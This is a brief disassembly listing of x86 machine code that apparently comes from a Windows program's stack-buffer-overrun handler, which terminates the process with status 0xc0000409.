  403a2a:	68 09 04 00 c0       	push   $0xc0000409
  403a2f:	ff 15 18 40 40 00    	call   *0x404018
  403a35:	50                   	push   %eax
  403a36:	ff 15 1c 40 40 00    	call   *0x40401c
  403a3c:	c9                   	leave
  403a3d:	c3                   	ret
  403a3e:	ff 25 a8 40 40 00    	jmp    *0x4040a8
